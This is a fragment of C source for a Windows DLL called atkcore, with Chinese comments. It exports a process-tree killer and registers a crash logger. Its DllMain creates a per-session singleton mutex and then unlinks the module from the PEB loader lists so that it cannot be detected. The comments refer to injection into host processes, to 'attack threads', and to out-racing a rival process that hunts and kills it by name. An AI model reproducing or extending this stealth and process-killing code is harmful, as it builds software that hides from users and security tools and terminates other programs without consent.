   这样窗口层只需负责"发现"，真正的杀+锁死+删除全部集中在 atkcore 里一套实现。 */
__declspec(dllexport) void WINAPI XxKillTree(DWORD pid)
{
    if (pid > 4 && pid != GetCurrentProcessId()) KillProcessTree(pid);
}

/* 崩溃日志：写进共享日志（弹窗能看见），避免宿主崩掉后日志也拿不到 */
static LONG WINAPI AtkCrashFilter(EXCEPTION_POINTERS *ep)
{
    DWORD code = 0;
    void *addr = NULL;
    if (ep && ep->ExceptionRecord) { code = ep->ExceptionRecord->ExceptionCode; addr = ep->ExceptionRecord->ExceptionAddress; }
    WriteKillLog(L"[CRASH] atkcore.dll pid=%lu code=0x%08lX addr=%p", GetCurrentProcessId(), (unsigned long)code, addr);
    return EXCEPTION_EXECUTE_HANDLER;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinst);
        SetUnhandledExceptionFilter(AtkCrashFilter);

        /* 摘 PEB 链后自身模块就查不到了，先缓存句柄 */
        g_hSelfModule = hinst;

        /* 进程内单例：模块隐藏后注入方无法判断宿主里有没有我们；已有实例就让
           加载失败，避免同进程叠出多套攻击线程。名字带会话 token，对手无法预先抢占。
           **这里刻意不等 token**：创建/探测共用一张候选表（token → 共享 salt →
           固定值 → 裸名，见 xxipc.h），所以 DllMain 这一刻还没收到 token 也能建对名字；
           而 yy 的 HunterWorker 每 50ms 按名杀一轮，任何等待都是白送时间。 */
        g_hSingleton = XXModuleSingleton(L"atkcore", NameTok());
        if (!g_hSingleton) return FALSE;

        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */

        EnsureLogInit();
    }
    return TRUE;
}

























